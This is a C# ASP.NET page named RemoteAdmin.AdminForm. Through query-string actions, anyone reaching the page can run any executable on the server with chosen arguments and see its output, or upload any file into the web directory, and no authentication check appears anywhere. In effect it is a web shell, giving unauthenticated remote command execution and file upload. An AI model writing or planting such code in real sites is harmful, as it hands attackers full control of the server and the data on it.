using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.HtmlControls;
using System.IO;

namespace RemoteAdmin
{
	/// <summary>
	/// Summary description for AdminForm.
	/// </summary>
	public class AdminForm : System.Web.UI.Page
	{
		protected System.Web.UI.WebControls.TextBox FilePath;
		protected System.Web.UI.WebControls.TextBox Args;
		protected System.Web.UI.WebControls.TextBox Input;
		protected System.Web.UI.WebControls.Button Submit;
		protected System.Web.UI.WebControls.Button Upload;
		protected System.Web.UI.HtmlControls.HtmlTable CommandTable;
		protected System.Web.UI.HtmlControls.HtmlGenericControl Output;
		protected System.Web.UI.HtmlControls.HtmlTable LoadTable;
		protected System.Web.UI.HtmlControls.HtmlInputFile MyFile;
		protected System.Web.UI.WebControls.TextBox WorkingDir;
		protected System.Web.UI.HtmlControls.HtmlGenericControl Message;
	
		private void Page_Load(object sender, System.EventArgs e)
		{
			if(IsPostBack)
			{
				try
				{
					if(CommandTable.Visible)
					{
						string sFilePath = FilePath.Text.Trim();
						string sWorkingDir = WorkingDir.Text.Trim();
						string sArgs = Args.Text.Trim();
						CommandLib.CommandObj oCommand = new CommandLib.CommandObj();
						Output.InnerText = oCommand.Run(sFilePath, sArgs, Input.Text, sWorkingDir, 0);
					}
					if(LoadTable.Visible)
					{
						Message.InnerText = "";
						if(MyFile.PostedFile!=null)
						{
							string sFileName = MyFile.PostedFile.FileName.ToLower();
							if(sFileName!="")
							{
								int i = sFileName.LastIndexOf("\\");
								if(i<0) i = sFileName.LastIndexOf("/");
								if(i<0) i = 0;
								string sUploadedFile = Server.MapPath(".") + "\\" + Guid.NewGuid().ToString() + "_" + sFileName.Substring(i+1);
								MyFile.PostedFile.SaveAs(sUploadedFile);
								Message.InnerText = sUploadedFile;
							}
						}
					}
				}
				catch(Exception oBug)
				{
					if(LoadTable.Visible) Message.InnerText = "Error: " + oBug.Message;
					if(CommandTable.Visible) Output.InnerText = "Error: " + oBug.Message;
				}
			}
			else
			{
				CommandTable.Visible = false;
				LoadTable.Visible = false;
				string sAction = Request.QueryString["Action"];
				if(sAction!=null)
				{
					sAction = sAction.Trim().ToLower();
					if(sAction=="load")
					{
						CommandTable.Visible = false;
						LoadTable.Visible = true;
					}
					else if(sAction=="run")
					{
						CommandTable.Visible = true;
						LoadTable.Visible = false;
					}
				}
			}
		}

		#region Web Form Designer generated code
		override protected void OnInit(EventArgs e)
		{
			//
			// CODEGEN: This call is required by the ASP.NET Web Form Designer.
			//
			InitializeComponent();
			base.OnInit(e);
		}
		
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{    
			this.Load += new System.EventHandler(this.Page_Load);

		}
		#endregion

	}
}
